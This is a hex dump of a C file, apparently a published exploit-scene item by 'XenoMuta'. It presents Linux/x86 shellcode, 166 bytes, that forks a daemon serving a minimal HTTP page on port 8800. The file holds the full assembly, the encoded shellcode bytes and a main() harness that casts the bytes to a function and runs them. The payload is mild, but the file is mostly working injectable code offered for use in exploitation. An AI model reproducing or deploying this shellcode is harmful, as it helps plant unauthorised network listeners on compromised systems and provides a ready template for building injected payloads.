00000000  2f 2a 0d 0a 20 20 20 20  5f 20 20 5f 5f 20 20 20  |/*..    _  __   |
00000010  20 20 20 20 20 20 20 20  20 20 20 20 20 20 5f 5f  |              __|
00000020  20 20 5f 5f 5f 20 20 20  20 20 20 5f 5f 0d 0a 20  |  ___      __.. |
00000030  20 20 7c 20 7c 2f 20 2f  5f 5f 20 20 5f 5f 5f 5f  |  | |/ /__  ____|
00000040  20 20 5f 5f 5f 5f 20 20  2f 20 20 7c 2f 20 20 2f  |  ____  /  |/  /|
00000050  5f 20 20 5f 5f 2f 20 2f  5f 5f 5f 5f 5f 20 5f 0d  |_  __/ /_____ _.|
00000060  0a 20 20 20 7c 20 20 20  2f 20 5f 20 5c 2f 20 5f  |.   |   / _ \/ _|
00000070  5f 20 5c 2f 20 5f 5f 20  5c 2f 20 2f 7c 5f 2f 20  |_ \/ __ \/ /|_/ |
00000080  2f 20 2f 20 2f 20 2f 20  5f 5f 2f 20 5f 5f 20 60  |/ / / / __/ __ `|
00000090  2f 0d 0a 20 20 2f 20 20  20 2f 20 20 5f 5f 2f 20  |/..  /   /  __/ |
000000a0  2f 20 2f 20 2f 20 2f 5f  2f 20 2f 20 2f 20 20 2f  |/ / / /_/ / /  /|
000000b0  20 2f 20 2f 5f 2f 20 2f  20 2f 5f 2f 20 2f 5f 2f  | / /_/ / /_/ /_/|
000000c0  20 2f 0d 0a 20 2f 5f 2f  7c 5f 5c 5f 5f 5f 2f 5f  | /.. /_/|_\___/_|
000000d0  2f 20 2f 5f 2f 5c 5f 5f  5f 5f 2f 5f 2f 20 20 2f  |/ /_/\____/_/  /|
000000e0  5f 2f 5c 5f 5f 2c 5f 2f  5c 5f 5f 2f 5c 5f 5f 2c  |_/\__,_/\__/\__,|
000000f0  5f 2f 0d 0a 0d 0a 20 78  65 6e 6f 6d 75 74 61 5c  |_/.... xenomuta\|
00000100  78 34 30 70 68 72 65 61  6b 65 72 5c 78 32 65 6e  |x40phreaker\x2en|
00000110  65 74 0d 0a 20 68 74 74  70 3a 2f 2f 78 65 6e 6f  |et.. http://xeno|
00000120  6d 75 74 61 2e 74 75 78  66 61 6d 69 6c 79 2e 6f  |muta.tuxfamily.o|
00000130  72 67 2f 20 2d 20 4d 65  74 68 79 6c 78 61 6e 74  |rg/ - Methylxant|
00000140  69 6e 61 20 32 35 36 6d  67 0d 0a 0d 0a 20 44 65  |ina 256mg.... De|
00000150  73 63 72 69 70 74 69 6f  6e 3a 0d 0a 20 61 20 6c  |scription:.. a l|
00000160  69 6e 75 78 2f 78 38 36  20 73 68 65 6c 6c 63 6f  |inux/x86 shellco|
00000170  64 65 20 74 68 61 74 20  66 6f 72 6b 73 20 61 20  |de that forks a |
00000180  48 54 54 50 20 53 65 72  76 65 72 20 6f 6e 20 70  |HTTP Server on p|
00000190  6f 72 74 20 74 63 70 2f  38 38 30 30 0d 0a 0d 0a  |ort tcp/8800....|
000001a0  20 4f 53 3a 20 4c 69 6e  75 78 0d 0a 20 41 72 63  | OS: Linux.. Arc|
000001b0  68 3a 20 78 38 36 0d 0a  20 4c 65 6e 67 74 68 3a  |h: x86.. Length:|
000001c0  20 31 36 36 20 62 79 74  65 73 0d 0a 20 41 75 74  | 166 bytes.. Aut|
000001d0  68 6f 72 3a 20 58 65 6e  6f 4d 75 74 61 0d 0a 0d  |hor: XenoMuta...|
000001e0  0a 20 68 6f 6c 61 20 61  74 3a 0d 0a 20 20 73 74  |. hola at:..  st|
000001f0  72 30 6b 33 2c 20 67 61  72 61 79 2c 20 66 72 31  |r0k3, garay, fr1|
00000200  74 30 6c 34 79 2c 20 65  6d 72 61 2e 0d 0a 20 20  |t0l4y, emra...  |
00000210  2d 20 47 6f 64 20 62 6c  65 73 73 20 79 6f 75 20  |- God bless you |
00000220  61 6c 6c 20 2d 0d 0a 20  0d 0a 3d 3d 3d 3d 20 53  |all -.. ..==== S|
00000230  4f 55 52 43 45 20 43 4f  44 45 20 3d 3d 3d 3d 0d  |OURCE CODE ====.|
00000240  0a 2e 67 6c 6f 62 6c 20  5f 73 74 61 72 74 0d 0a  |..globl _start..|
00000250  5f 73 74 61 72 74 3a 0d  0a 09 78 6f 72 20 25 65  |_start:...xor %e|
00000260  61 78 2c 20 25 65 61 78  0d 0a 09 6d 6f 76 20 24  |ax, %eax...mov $|
00000270  30 78 30 32 2c 20 25 61  6c 0d 0a 09 69 6e 74 20  |0x02, %al...int |
00000280  24 30 78 38 30 0d 0a 09  74 65 73 74 20 25 65 61  |$0x80...test %ea|
00000290  78 2c 20 25 65 61 78 0d  0a 09 6a 7a 20 73 6f 63  |x, %eax...jz soc|
000002a0  6b 65 74 0d 0a 09 78 6f  72 20 25 65 61 78 2c 20  |ket...xor %eax, |
000002b0  25 65 61 78 0d 0a 09 69  6e 63 62 20 25 61 6c 0d  |%eax...incb %al.|
000002c0  0a 09 69 6e 74 20 24 30  78 38 30 0d 0a 74 78 74  |..int $0x80..txt|
000002d0  3a 0d 0a 09 70 6f 70 20  25 65 63 78 0d 0a 09 6d  |:...pop %ecx...m|
000002e0  6f 76 62 20 24 32 37 2c  20 25 64 6c 0d 0a 09 69  |ovb $27, %dl...i|
000002f0  6e 74 20 24 30 78 38 30  0d 0a 0d 0a 63 6c 6f 73  |nt $0x80....clos|
00000300  65 3a 0d 0a 09 6d 6f 76  62 20 24 30 78 36 2c 20  |e:...movb $0x6, |
00000310  25 61 6c 0d 0a 09 6d 6f  76 20 25 65 73 69 2c 20  |%al...mov %esi, |
00000320  25 65 62 78 0d 0a 09 69  6e 74 20 24 30 78 38 30  |%ebx...int $0x80|
00000330  0d 0a 0d 0a 65 78 69 74  3a 0d 0a 09 6d 6f 76 20  |....exit:...mov |
00000340  24 30 78 30 31 2c 20 25  61 6c 0d 0a 09 78 6f 72  |$0x01, %al...xor|
00000350  20 25 65 62 78 2c 20 25  65 62 78 0d 0a 09 69 6e  | %ebx, %ebx...in|
00000360  74 20 24 30 78 38 30 0d  0a 0d 0a 73 6f 63 6b 65  |t $0x80....socke|
00000370  74 63 61 6c 6c 3a 0d 0a  09 70 6f 70 20 25 65 73  |tcall:...pop %es|
00000380  69 0d 0a 09 6d 6f 76 20  24 30 78 36 36 2c 20 25  |i...mov $0x66, %|
00000390  61 6c 0d 0a 09 69 6e 63  62 20 25 62 6c 0d 0a 09  |al...incb %bl...|
000003a0  6d 6f 76 20 25 65 73 70  2c 20 25 65 63 78 0d 0a  |mov %esp, %ecx..|
000003b0  09 69 6e 74 20 24 30 78  38 30 0d 0a 09 6a 6d 70  |.int $0x80...jmp|
000003c0  20 2a 25 65 73 69 0d 0a  0d 0a 73 6f 63 6b 65 74  | *%esi....socket|
000003d0  3a 0d 0a 09 63 6c 74 64  0d 0a 09 78 6f 72 20 25  |:...cltd...xor %|
000003e0  65 61 78 2c 20 25 65 61  78 0d 0a 09 78 6f 72 20  |eax, %eax...xor |
000003f0  25 65 62 78 2c 20 25 65  62 78 0d 0a 09 70 75 73  |%ebx, %ebx...pus|
00000400  68 20 24 30 78 36 0d 0a  09 70 75 73 68 20 24 30  |h $0x6...push $0|
00000410  78 31 0d 0a 09 70 75 73  68 20 24 30 78 32 0d 0a  |x1...push $0x2..|
00000420  09 63 61 6c 6c 20 73 6f  63 6b 65 74 63 61 6c 6c  |.call socketcall|
00000430  0d 0a 0d 0a 62 69 6e 64  3a 0d 0a 09 6d 6f 76 20  |....bind:...mov |
00000440  25 65 61 78 2c 20 25 65  64 69 0d 0a 09 78 6f 72  |%eax, %edi...xor|
00000450  20 25 65 64 78 2c 20 25  65 64 78 0d 0a 09 70 75  | %edx, %edx...pu|
00000460  73 68 20 25 65 64 78 0d  0a 09 70 75 73 68 77 20  |sh %edx...pushw |
00000470  24 30 78 36 30 32 32 0d  0a 09 70 75 73 68 77 20  |$0x6022...pushw |
00000480  25 62 78 0d 0a 09 6d 6f  76 20 25 65 73 70 2c 20  |%bx...mov %esp, |
00000490  25 65 63 78 0d 0a 09 70  75 73 68 20 24 30 78 31  |%ecx...push $0x1|
000004a0  30 0d 0a 09 70 75 73 68  20 25 65 63 78 0d 0a 09  |0...push %ecx...|
000004b0  70 75 73 68 20 25 65 64  69 0d 0a 09 63 61 6c 6c  |push %edi...call|
000004c0  20 73 6f 63 6b 65 74 63  61 6c 6c 0d 0a 0d 0a 6c  | socketcall....l|
000004d0  69 73 74 65 6e 3a 0d 0a  09 69 6e 63 20 25 62 6c  |isten:...inc %bl|
000004e0  0d 0a 09 70 75 73 68 20  24 30 78 30 35 0d 0a 09  |...push $0x05...|
000004f0  70 75 73 68 20 25 65 64  69 0d 0a 09 63 61 6c 6c  |push %edi...call|
00000500  20 73 6f 63 6b 65 74 63  61 6c 6c 0d 0a 0d 0a 61  | socketcall....a|
00000510  63 63 65 70 74 3a 0d 0a  09 78 6f 72 20 25 65 63  |ccept:...xor %ec|
00000520  78 2c 20 25 65 63 78 0d  0a 09 70 75 73 68 20 25  |x, %ecx...push %|
00000530  65 64 78 0d 0a 09 70 75  73 68 20 25 65 64 78 0d  |edx...push %edx.|
00000540  0a 09 70 75 73 68 20 25  65 64 69 0d 0a 09 63 61  |..push %edi...ca|
00000550  6c 6c 20 73 6f 63 6b 65  74 63 61 6c 6c 0d 0a 09  |ll socketcall...|
00000560  0d 0a 66 6f 72 6b 3a 0d  0a 09 6d 6f 76 20 25 65  |..fork:...mov %e|
00000570  61 78 2c 20 25 65 73 69  0d 0a 09 78 6f 72 20 25  |ax, %esi...xor %|
00000580  65 61 78 2c 20 25 65 61  78 0d 0a 09 6d 6f 76 20  |eax, %eax...mov |
00000590  24 30 78 30 32 2c 20 25  61 6c 0d 0a 09 69 6e 74  |$0x02, %al...int|
000005a0  20 24 30 78 38 30 0d 0a  09 74 65 73 74 20 25 65  | $0x80...test %e|
000005b0  61 78 2c 20 25 65 61 78  0d 0a 09 6a 7a 20 77 72  |ax, %eax...jz wr|
000005c0  69 74 65 0d 0a 0d 0a 09  78 6f 72 20 25 65 61 78  |ite.....xor %eax|
000005d0  2c 20 25 65 61 78 0d 0a  09 6d 6f 76 20 24 30 78  |, %eax...mov $0x|
000005e0  30 36 2c 20 25 61 6c 0d  0a 09 6d 6f 76 20 25 65  |06, %al...mov %e|
000005f0  73 69 2c 20 25 65 62 78  0d 0a 09 69 6e 74 20 24  |si, %ebx...int $|
00000600  30 78 38 30 0d 0a 0d 0a  09 78 6f 72 20 25 65 61  |0x80.....xor %ea|
00000610  78 2c 20 25 65 61 78 0d  0a 09 78 6f 72 20 25 65  |x, %eax...xor %e|
00000620  62 78 2c 20 25 65 62 78  0d 0a 09 6d 6f 76 20 24  |bx, %ebx...mov $|
00000630  30 78 30 34 2c 20 25 62  6c 0d 0a 09 6a 6d 70 20  |0x04, %bl...jmp |
00000640  61 63 63 65 70 74 0d 0a  0d 0a 77 72 69 74 65 3a  |accept....write:|
00000650  0d 0a 09 6d 6f 76 20 25  65 73 69 2c 20 25 65 62  |...mov %esi, %eb|
00000660  78 0d 0a 09 6d 6f 76 20  24 30 78 30 34 2c 20 25  |x...mov $0x04, %|
00000670  61 6c 0d 0a 09 63 61 6c  6c 20 74 78 74 0d 0a 09  |al...call txt...|
00000680  2e 73 74 72 69 6e 67 20  22 48 54 54 50 2f 31 2e  |.string "HTTP/1.|
00000690  30 20 32 30 30 5c 72 5c  6e 5c 72 5c 6e 3c 68 31  |0 200\r\n\r\n<h1|
000006a0  3e 3a 29 3c 2f 68 31 3e  22 0d 0a 3d 3d 3d 3d 20  |>:)</h1>"..==== |
000006b0  53 4f 55 52 43 45 20 43  4f 44 45 20 3d 3d 3d 3d  |SOURCE CODE ====|
000006c0  0d 0a 2a 2f 0d 0a 63 68  61 72 20 73 68 65 6c 6c  |..*/..char shell|
000006d0  63 6f 64 65 5b 5d 20 3d  20 22 5c 78 33 31 5c 78  |code[] = "\x31\x|
000006e0  63 30 5c 78 62 30 5c 78  30 32 5c 78 63 64 5c 78  |c0\xb0\x02\xcd\x|
000006f0  38 30 5c 78 38 35 5c 78  63 30 5c 78 37 34 5c 78  |80\x85\xc0\x74\x|
00000700  32 32 5c 78 33 31 5c 78  63 30 5c 78 66 65 5c 78  |22\x31\xc0\xfe\x|
00000710  63 30 5c 78 63 64 5c 78  38 30 5c 78 35 39 5c 78  |c0\xcd\x80\x59\x|
00000720  62 32 5c 78 31 62 5c 78  63 64 5c 78 38 30 5c 78  |b2\x1b\xcd\x80\x|
00000730  62 30 5c 78 30 36 5c 78  38 39 5c 78 66 33 5c 78  |b0\x06\x89\xf3\x|
00000740  63 64 5c 78 38 30 5c 78  62 30 5c 78 30 31 5c 78  |cd\x80\xb0\x01\x|
00000750  33 31 5c 78 64 62 5c 78  63 64 5c 78 38 30 5c 78  |31\xdb\xcd\x80\x|
00000760  35 65 5c 78 62 30 5c 78  36 36 5c 78 66 65 5c 78  |5e\xb0\x66\xfe\x|
00000770  63 33 5c 78 38 39 5c 78  65 31 5c 78 63 64 5c 78  |c3\x89\xe1\xcd\x|
00000780  38 30 5c 78 66 66 5c 78  65 36 5c 78 39 39 5c 78  |80\xff\xe6\x99\x|
00000790  33 31 5c 78 63 30 5c 78  33 31 5c 78 64 62 5c 78  |31\xc0\x31\xdb\x|
000007a0  36 61 5c 78 30 36 5c 78  36 61 5c 78 30 31 5c 78  |6a\x06\x6a\x01\x|
000007b0  36 61 5c 78 30 32 5c 78  65 38 5c 78 65 35 5c 78  |6a\x02\xe8\xe5\x|
000007c0  66 66 5c 78 66 66 5c 78  66 66 5c 78 38 39 5c 78  |ff\xff\xff\x89\x|
000007d0  63 37 5c 78 33 31 5c 78  64 32 5c 78 35 32 5c 78  |c7\x31\xd2\x52\x|
000007e0  36 36 5c 78 36 38 5c 78  32 32 5c 78 36 30 5c 78  |66\x68\x22\x60\x|
000007f0  36 36 5c 78 35 33 5c 78  38 39 5c 78 65 31 5c 78  |66\x53\x89\xe1\x|
00000800  36 61 5c 78 31 30 5c 78  35 31 5c 78 35 37 5c 78  |6a\x10\x51\x57\x|
00000810  65 38 5c 78 63 66 5c 78  66 66 5c 78 66 66 5c 78  |e8\xcf\xff\xff\x|
00000820  66 66 5c 78 66 65 5c 78  63 33 5c 78 36 61 5c 78  |ff\xfe\xc3\x6a\x|
00000830  30 35 5c 78 35 37 5c 78  65 38 5c 78 63 35 5c 78  |05\x57\xe8\xc5\x|
00000840  66 66 5c 78 66 66 5c 78  66 66 5c 78 33 31 5c 78  |ff\xff\xff\x31\x|
00000850  63 39 5c 78 35 32 5c 78  35 32 5c 78 35 37 5c 78  |c9\x52\x52\x57\x|
00000860  65 38 5c 78 62 62 5c 78  66 66 5c 78 66 66 5c 78  |e8\xbb\xff\xff\x|
00000870  66 66 5c 78 38 39 5c 78  63 36 5c 78 33 31 5c 78  |ff\x89\xc6\x31\x|
00000880  63 30 5c 78 62 30 5c 78  30 32 5c 78 63 64 5c 78  |c0\xb0\x02\xcd\x|
00000890  38 30 5c 78 38 35 5c 78  63 30 5c 78 37 34 5c 78  |80\x85\xc0\x74\x|
000008a0  31 30 5c 78 33 31 5c 78  63 30 5c 78 62 30 5c 78  |10\x31\xc0\xb0\x|
000008b0  30 36 5c 78 38 39 5c 78  66 33 5c 78 63 64 5c 78  |06\x89\xf3\xcd\x|
000008c0  38 30 5c 78 33 31 5c 78  63 30 5c 78 33 31 5c 78  |80\x31\xc0\x31\x|
000008d0  64 62 5c 78 62 33 5c 78  30 34 5c 78 65 62 5c 78  |db\xb3\x04\xeb\x|
000008e0  64 61 5c 78 38 39 5c 78  66 33 5c 78 62 30 5c 78  |da\x89\xf3\xb0\x|
000008f0  30 34 5c 78 65 38 5c 78  38 35 5c 78 66 66 5c 78  |04\xe8\x85\xff\x|
00000900  66 66 5c 78 66 66 5c 78  34 38 5c 78 35 34 5c 78  |ff\xff\x48\x54\x|
00000910  35 34 5c 78 35 30 5c 78  32 66 5c 78 33 31 5c 78  |54\x50\x2f\x31\x|
00000920  32 65 5c 78 33 30 5c 78  32 30 5c 78 33 32 5c 78  |2e\x30\x20\x32\x|
00000930  33 30 5c 78 33 30 5c 78  30 64 5c 78 30 61 5c 78  |30\x30\x0d\x0a\x|
00000940  30 64 5c 78 30 61 5c 78  33 63 5c 78 36 38 5c 78  |0d\x0a\x3c\x68\x|
00000950  33 31 5c 78 33 65 5c 78  33 61 5c 78 32 39 5c 78  |31\x3e\x3a\x29\x|
00000960  33 63 5c 78 32 66 5c 78  36 38 5c 78 33 31 5c 78  |3c\x2f\x68\x31\x|
00000970  33 65 22 3b 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |3e";....int main|
00000980  20 28 29 0d 0a 7b 0d 0a  09 70 72 69 6e 74 66 28  | ()..{...printf(|
00000990  22 4c 65 6e 67 74 68 3a  20 25 64 20 62 79 74 65  |"Length: %d byte|
000009a0  73 5c 6e 22 2c 20 73 74  72 6c 65 6e 28 73 68 65  |s\n", strlen(she|
000009b0  6c 6c 63 6f 64 65 29 29  3b 0d 0a 09 69 6e 74 20  |llcode));...int |
000009c0  28 2a 73 63 29 28 29 20  3d 20 28 69 6e 74 20 28  |(*sc)() = (int (|
000009d0  2a 29 28 29 29 73 68 65  6c 6c 63 6f 64 65 3b 0d  |*)())shellcode;.|
000009e0  0a 09 73 63 28 29 3b 0d  0a 09 72 65 74 75 72 6e  |..sc();...return|
000009f0  20 30 3b 0d 0a 7d                                 | 0;..}|
000009f6
